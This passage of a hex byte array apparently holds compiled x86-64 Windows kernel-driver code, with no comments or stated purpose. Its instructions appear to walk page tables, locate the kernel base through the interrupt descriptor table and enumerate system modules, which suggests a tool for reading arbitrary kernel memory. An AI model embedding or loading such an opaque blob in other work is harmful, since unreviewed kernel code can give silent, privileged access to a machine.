	0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x8C, 0x24, 0x90, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x54, 0x24, 0x40, 0x48, 0x8D, 0x0C, 0xD1, 0x4C, 0x8D,
	0x44, 0x24, 0x38, 0x48, 0x8B, 0xD0, 0xE8, 0x35, 0xFD, 0xFF, 0xFF, 0x48,
	0x89, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x83, 0xE0,
	0x01, 0x48, 0x85, 0xC0, 0x75, 0x07, 0x33, 0xC0, 0xE9, 0xCA, 0x01, 0x00,
	0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8,
	0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24,
	0x48, 0x48, 0x23, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x58,
	0x48, 0x8D, 0x04, 0xC8, 0x4C, 0x8D, 0x4C, 0x24, 0x38, 0x41, 0xB8, 0x08,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x20, 0x48, 0x8B, 0xC8, 0xE8,
	0x4C, 0xFD, 0xFF, 0xFF, 0x85, 0xC0, 0x7D, 0x07, 0x33, 0xC0, 0xE9, 0x80,
	0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x83, 0xE0, 0x01,
	0x48, 0x85, 0xC0, 0x75, 0x07, 0x33, 0xC0, 0xE9, 0x6B, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x25, 0x80, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x2C, 0x48, 0xB8, 0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0x23, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x8B, 0x8C, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x81, 0xE1,
	0xFF, 0xFF, 0xFF, 0x3F, 0x48, 0x03, 0xC1, 0xE9, 0x2F, 0x01, 0x00, 0x00,
	0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x00,
	0xF0, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x20,
	0x48, 0x23, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48,
	0x8D, 0x04, 0xC8, 0x4C, 0x8D, 0x4C, 0x24, 0x38, 0x41, 0xB8, 0x08, 0x00,
	0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x28, 0x48, 0x8B, 0xC8, 0xE8, 0xB1,
	0xFC, 0xFF, 0xFF, 0x85, 0xC0, 0x7D, 0x07, 0x33, 0xC0, 0xE9, 0xE5, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x83, 0xE0, 0x01, 0x48,
	0x85, 0xC0, 0x75, 0x07, 0x33, 0xC0, 0xE9, 0xD0, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x44, 0x24, 0x28, 0x48, 0x25, 0x80, 0x00, 0x00, 0x00, 0x48, 0x85,
	0xC0, 0x74, 0x2C, 0x48, 0xB8, 0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x23, 0xC8, 0x48, 0x8B, 0xC1,
	0x48, 0x8B, 0x8C, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x81, 0xE1, 0xFF,
	0xFF, 0x1F, 0x00, 0x48, 0x03, 0xC1, 0xE9, 0x94, 0x00, 0x00, 0x00, 0x48,
	0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x00, 0xF0,
	0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48,
	0x23, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x68, 0x48, 0x8D,
	0x04, 0xC8, 0x4C, 0x8D, 0x4C, 0x24, 0x38, 0x41, 0xB8, 0x08, 0x00, 0x00,
	0x00, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x48, 0x8B, 0xC8, 0xE8, 0x16, 0xFC,
	0xFF, 0xFF, 0x85, 0xC0, 0x7D, 0x04, 0x33, 0xC0, 0xEB, 0x4D, 0x48, 0xB8,
	0x00, 0xF0, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24,
	0x30, 0x48, 0x23, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x30,
	0x48, 0x83, 0x7C, 0x24, 0x30, 0x00, 0x74, 0x17, 0x48, 0x8B, 0x44, 0x24,
	0x70, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1,
	0x48, 0x89, 0x44, 0x24, 0x50, 0xEB, 0x09, 0x48, 0xC7, 0x44, 0x24, 0x50,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x50, 0xEB, 0x04, 0x33,
	0xC0, 0xEB, 0x00, 0x48, 0x81, 0xC4, 0x88, 0x00, 0x00, 0x00, 0xC3, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24,
	0x08, 0x48, 0x83, 0xEC, 0x58, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00,
	0x00, 0xE8, 0x6A, 0xC4, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48,
	0x8B, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8D, 0x0D,
	0x2C, 0x57, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0xFF, 0x15, 0x51,
	0x46, 0x00, 0x00, 0x89, 0x44, 0x24, 0x20, 0x83, 0x7C, 0x24, 0x20, 0x00,
	0x7D, 0x02, 0xEB, 0x33, 0xE8, 0x87, 0xC5, 0xFF, 0xFF, 0x48, 0x89, 0x44,
	0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x40, 0x08, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44,
	0x24, 0x48, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x48,
	0xFF, 0x15, 0x12, 0x46, 0x00, 0x00, 0x90, 0x48, 0x83, 0xC4, 0x58, 0xC3,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C,
	0x24, 0x08, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x38, 0xC7,
	0x40, 0x30, 0xBB, 0x00, 0x00, 0xC0, 0x33, 0xD2, 0x48, 0x8B, 0x4C, 0x24,
	0x38, 0xFF, 0x15, 0x89, 0x45, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x38,
	0x8B, 0x40, 0x30, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38,
	0xE8, 0xA7, 0xEC, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x14, 0xE8, 0x2D,
	0xEC, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x0A, 0xC7, 0x44, 0x24, 0x20,
	0x01, 0x00, 0x00, 0x00, 0xEB, 0x08, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x4C, 0x89, 0x4C, 0x24, 0x20, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89,
	0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC,
	0x60, 0x48, 0x83, 0x7C, 0x24, 0x70, 0x00, 0x74, 0x13, 0x48, 0x83, 0x7C,
	0x24, 0x78, 0x00, 0x74, 0x0B, 0x48, 0x83, 0xBC, 0x24, 0x88, 0x00, 0x00,
	0x00, 0x00, 0x75, 0x0A, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xE9, 0x71, 0x01,
	0x00, 0x00, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D,
	0x44, 0x24, 0x34, 0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x04, 0x00, 0x00,
	0x00, 0xF3, 0xAA, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24,
	0x30, 0x48, 0x83, 0x7C, 0x24, 0x30, 0x00, 0x74, 0x08, 0x48, 0x83, 0x7C,
	0x24, 0x30, 0xFF, 0x75, 0x0A, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xE9, 0x34,
	0x01, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00,
	0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x7F, 0xC3, 0xFF,
	0xFF, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44,
	0x24, 0x48, 0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x94, 0x24,
	0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8B, 0x44,
	0x24, 0x48, 0xFF, 0x15, 0xC0, 0x44, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24,
	0x28, 0x48, 0x83, 0x7C, 0x24, 0x28, 0x00, 0x75, 0x0D, 0xC7, 0x44, 0x24,
	0x20, 0x9A, 0x00, 0x00, 0xC0, 0xE9, 0x92, 0x00, 0x00, 0x00, 0xE8, 0xC9,
	0xF0, 0xFF, 0xFF, 0x0F, 0xB6, 0xC0, 0x85, 0xC0, 0x74, 0x4A, 0x48, 0x8B,
	0x4C, 0x24, 0x28, 0xFF, 0x15, 0x4F, 0x44, 0x00, 0x00, 0x0F, 0xB6, 0xC0,
	0x85, 0xC0, 0x74, 0x2C, 0x44, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x54, 0x24, 0x78, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xE8, 0xF9,
	0x16, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x8C, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x08, 0xEB, 0x0A,
	0xC7, 0x44, 0x24, 0x20, 0x05, 0x00, 0x00, 0xC0, 0xEB, 0x3E, 0xEB, 0x2A,
	0x44, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x54, 0x24,
	0x78, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0xE8, 0xC1, 0x16, 0x00, 0x00, 0x48,
	0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0x80,
	0x00, 0x00, 0x00, 0x48, 0x89, 0x08, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x08, 0xC7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0xC0,
	0x48, 0x83, 0x7C, 0x24, 0x28, 0x00, 0x74, 0x2F, 0xE8, 0xAF, 0xC3, 0xFF,
	0xFF, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x48,
	0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x94, 0x24, 0x80, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x4C, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x58, 0xFF, 0x15,
	0xE0, 0x43, 0x00, 0x00, 0x90, 0xEB, 0x00, 0x8B, 0x44, 0x24, 0x20, 0x48,
	0x83, 0xC4, 0x60, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x68, 0x48, 0x8B, 0x05, 0xC5,
	0x53, 0x00, 0x00, 0x48, 0x33, 0xC4, 0x48, 0x89, 0x44, 0x24, 0x50, 0x0F,
	0x01, 0x4C, 0x24, 0x40, 0x48, 0x83, 0x7C, 0x24, 0x42, 0x00, 0x75, 0x01,
	0xCC, 0x33, 0xD2, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xE8, 0x13, 0xC5, 0xFF,
	0xFF, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x0F,
	0xB7, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x0F, 0xB7, 0x49, 0x06, 0x48,
	0xC1, 0xE1, 0x10, 0x48, 0x0B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x8B,
	0x49, 0x08, 0x48, 0xC1, 0xE1, 0x20, 0x48, 0x0B, 0xC1, 0x48, 0x89, 0x44,
	0x24, 0x30, 0xB9, 0x02, 0x00, 0x00, 0x00, 0xE8, 0xF8, 0xC4, 0xFF, 0xFF,
	0x48, 0xFF, 0xC8, 0x48, 0xF7, 0xD0, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48,
	0x23, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B,
	0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24,
	0x20, 0xE8, 0xEE, 0x14, 0x00, 0x00, 0x0F, 0xB6, 0xC0, 0x85, 0xC0, 0x75,
	0x1C, 0xB9, 0x02, 0x00, 0x00, 0x00, 0xE8, 0xBD, 0xC4, 0xFF, 0xFF, 0x48,
	0x8B, 0x4C, 0x24, 0x20, 0x48, 0x2B, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89,
	0x44, 0x24, 0x20, 0xEB, 0xD3, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B,
	0x4C, 0x24, 0x50, 0x48, 0x33, 0xCC, 0xE8, 0xF9, 0x1C, 0x00, 0x00, 0x48,
	0x83, 0xC4, 0x68, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x54, 0x24,
	0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x56, 0x57, 0x48, 0x81, 0xEC, 0xE8,
	0x01, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xE6, 0x52, 0x00, 0x00, 0x48, 0x33,
	0xC4, 0x48, 0x89, 0x84, 0x24, 0xD0, 0x01, 0x00, 0x00, 0xC7, 0x44, 0x24,
	0x44, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x34, 0x00, 0x00, 0x00,
	0x00, 0xE8, 0x36, 0xBF, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48,
	0x8B, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x58, 0x4C, 0x8D, 0x4C,
	0x24, 0x34, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x54, 0x24, 0x34, 0xB9, 0x0B,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x58, 0xFF, 0x15, 0x92, 0x42,
	0x00, 0x00, 0xE8, 0x75, 0xBE, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x60,
	0x8B, 0x44, 0x24, 0x34, 0x48, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x44,
	0x24, 0x60, 0x48, 0x89, 0x44, 0x24, 0x70, 0x41, 0xB8, 0x64, 0x61, 0x45,
	0x64, 0x48, 0x8B, 0x54, 0x24, 0x68, 0x33, 0xC9, 0x48, 0x8B, 0x44, 0x24,
	0x70, 0xFF, 0x15, 0x5D, 0x42, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x38,
	0x48, 0x83, 0x7C, 0x24, 0x38, 0x00, 0x75, 0x07, 0x33, 0xC0, 0xE9, 0x38,
	0x01, 0x00, 0x00, 0xE8, 0xBC, 0xBE, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24,
	0x78, 0x8B, 0x44, 0x24, 0x34, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44,
	0x24, 0x78, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x45, 0x33,
	0xC9, 0x44, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x54, 0x24, 0x38, 0xB9,
	0x0B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00,
	0xFF, 0x15, 0x0A, 0x42, 0x00, 0x00, 0x89, 0x44, 0x24, 0x44, 0xC7, 0x44,
	0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x00,
	0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xEB,
	0x0A, 0x8B, 0x44, 0x24, 0x30, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x30, 0x8B,
	0x44, 0x24, 0x30, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x3B, 0x01, 0x0F,
	0x83, 0x84, 0x00, 0x00, 0x00, 0x0F, 0xAE, 0xE8, 0x8B, 0x44, 0x24, 0x30,
	0x48, 0x69, 0xC0, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xA0,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x38, 0x48, 0x8B, 0xF9, 0x48,
	0x8D, 0x74, 0x02, 0x08, 0xB9, 0x28, 0x01, 0x00, 0x00, 0xF3, 0xA4, 0x8B,
	0x44, 0x24, 0x30, 0x48, 0x69, 0xC0, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x4C, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x01, 0x18, 0x48, 0x89, 0x44, 0x24,
	0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x69, 0xC0, 0x28, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x4C, 0x24, 0x38, 0x8B, 0x44, 0x01, 0x20, 0x48, 0x8B, 0x8C,
	0x24, 0x08, 0x02, 0x00, 0x00, 0x48, 0x89, 0x01, 0x48, 0x8B, 0x94, 0x24,
	0x00, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xC8, 0x00, 0x00, 0x00,
	0xE8, 0x1F, 0x19, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x02, 0xEB, 0x05,
	0xE9, 0x60, 0xFF, 0xFF, 0xFF, 0xE8, 0x0E, 0xC2, 0xFF, 0xFF, 0x48, 0x89,
	0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x88, 0x00,
	0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0xBA, 0x64,
	0x61, 0x45, 0x64, 0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x8B, 0x84, 0x24,
	0x90, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x16, 0x41, 0x00, 0x00, 0x48, 0x8B,
	0x44, 0x24, 0x48, 0x48, 0x8B, 0x8C, 0x24, 0xD0, 0x01, 0x00, 0x00, 0x48,
	0x33, 0xCC, 0xE8, 0xF9, 0x1A, 0x00, 0x00, 0x48, 0x81, 0xC4, 0xE8, 0x01,
	0x00, 0x00, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,
	0xC7, 0x44, 0x24, 0x10, 0xD4, 0xE8, 0x27, 0xD9, 0xC7, 0x44, 0x24, 0x14,
	0x07, 0x67, 0xFA, 0x98, 0xC7, 0x44, 0x24, 0x18, 0xF8, 0x6D, 0xA0, 0x68,
	0xC7, 0x04, 0x24, 0x57, 0x56, 0xB6, 0xAF, 0xC7, 0x44, 0x24, 0x08, 0xF4,
	0xE2, 0x08, 0x5D, 0xC7, 0x44, 0x24, 0x04, 0x23, 0x49, 0xB0, 0x4C, 0xC7,
	0x44, 0x24, 0x0C, 0x6F, 0x06, 0xE9, 0x4A, 0x48, 0x8D, 0x05, 0x1E, 0x27,
	0x00, 0x00, 0x48, 0x89, 0x05, 0x97, 0x51, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0x40, 0x27, 0x00, 0x00, 0x48, 0x89, 0x05, 0x89, 0x51, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x42, 0x27, 0x00, 0x00, 0x48, 0x89, 0x05, 0x7B, 0x51, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0x44, 0x27, 0x00, 0x00, 0x48, 0x89, 0x05, 0x6D,
	0x51, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x56, 0x27, 0x00, 0x00, 0x48, 0x89,
	0x05, 0x5F, 0x51, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x0C, 0x8B, 0x0C, 0x24,
	0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x04, 0x24, 0x48, 0x8D, 0x05, 0x5A, 0x27,
	0x00, 0x00, 0x48, 0x89, 0x05, 0x43, 0x51, 0x00, 0x00, 0x8B, 0x44, 0x24,
	0x04, 0x2D, 0xC5, 0x03, 0x00, 0x00, 0x89, 0x44, 0x24, 0x04, 0x8B, 0x44,
	0x24, 0x08, 0x35, 0x48, 0xB1, 0x00, 0x00, 0x8B, 0x0C, 0x24, 0x2B, 0xC8,
	0x8B, 0xC1, 0x89, 0x04, 0x24, 0x48, 0x8D, 0x05, 0x3C, 0x27, 0x00, 0x00,
	0x48, 0x89, 0x05, 0x15, 0x51, 0x00, 0x00, 0x8B, 0x05, 0x07, 0x51, 0x00,
	0x00, 0x03, 0x44, 0x24, 0x08, 0x89, 0x05, 0xFD, 0x50, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x4E, 0x27, 0x00, 0x00, 0x48, 0x89, 0x05, 0xF7, 0x50, 0x00,
	0x00, 0x8B, 0x44, 0x24, 0x10, 0x8B, 0x4C, 0x24, 0x04, 0x03, 0xC8, 0x8B,
	0xC1, 0x89, 0x44, 0x24, 0x04, 0x48, 0x8D, 0x05, 0x40, 0x27, 0x00, 0x00,
	0x48, 0x89, 0x05, 0xD9, 0x50, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x52, 0x27,
	0x00, 0x00, 0x48, 0x89, 0x05, 0xCB, 0x50, 0x00, 0x00, 0x48, 0x83, 0xC4,
	0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x05, 0xB9,
	0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0xB2, 0x50, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0xCB, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA4, 0x50, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0xED, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0x96, 0x50,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0xEF, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05,
	0x88, 0x50, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x01, 0x2B, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x7A, 0x50, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x03, 0x2B, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x6C, 0x50, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x15,
	0x2B, 0x00, 0x00, 0x48, 0x89, 0x05, 0x5E, 0x50, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0x17, 0x2B, 0x00, 0x00, 0x48, 0x89, 0x05, 0x50, 0x50, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0x19, 0x2B, 0x00, 0x00, 0x48, 0x89, 0x05, 0x42, 0x50,
	0x00, 0x00, 0xC3, 0xCC, 0x48, 0x8D, 0x05, 0x59, 0x2C, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x32, 0x50, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x5B, 0x2C, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x24, 0x50, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x6D,
	0x2C, 0x00, 0x00, 0x48, 0x89, 0x05, 0x16, 0x50, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0x6F, 0x2C, 0x00, 0x00, 0x48, 0x89, 0x05, 0x08, 0x50, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0x71, 0x2C, 0x00, 0x00, 0x48, 0x89, 0x05, 0xFA, 0x4F,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0x83, 0x2C, 0x00, 0x00, 0x48, 0x89, 0x05,
	0xEC, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x85, 0x2C, 0x00, 0x00, 0x48,
	0x89, 0x05, 0xDE, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x87, 0x2C, 0x00,
	0x00, 0x48, 0x89, 0x05, 0xD0, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x99,
	0x2C, 0x00, 0x00, 0x48, 0x89, 0x05, 0xC2, 0x4F, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0xAB, 0x2C, 0x00, 0x00, 0x48, 0x89, 0x05, 0xB4, 0x4F, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0xAD, 0x2C, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA6, 0x4F,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0xAF, 0x2C, 0x00, 0x00, 0x48, 0x89, 0x05,
	0x98, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xB1, 0x2C, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x8A, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xC3, 0x2C, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x7C, 0x4F, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x05, 0x49,
	0x24, 0x00, 0x00, 0x48, 0x89, 0x05, 0x62, 0x4F, 0x00, 0x00, 0x48, 0x8D,
	0x05, 0x5B, 0x24, 0x00, 0x00, 0x48, 0x89, 0x05, 0x54, 0x4F, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0x5D, 0x24, 0x00, 0x00, 0x48, 0x89, 0x05, 0x46, 0x4F,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0x5F, 0x24, 0x00, 0x00, 0x48, 0x89, 0x05,
	0x38, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x61, 0x24, 0x00, 0x00, 0x48,
	0x89, 0x05, 0x2A, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x73, 0x24, 0x00,
	0x00, 0x48, 0x89, 0x05, 0x1C, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x85,
	0x24, 0x00, 0x00, 0x48, 0x89, 0x05, 0x0E, 0x4F, 0x00, 0x00, 0xC3, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x83, 0xEC, 0x18, 0xC7, 0x04, 0x24, 0x40, 0x6E, 0xF9, 0xE1, 0x48,
	0x8D, 0x05, 0xDE, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0xE7, 0x4E, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0xF0, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0xD9,
	0x4E, 0x00, 0x00, 0x8B, 0x05, 0xCB, 0x4E, 0x00, 0x00, 0x03, 0x04, 0x24,
	0x89, 0x05, 0xC2, 0x4E, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x18, 0xC3, 0xCC,
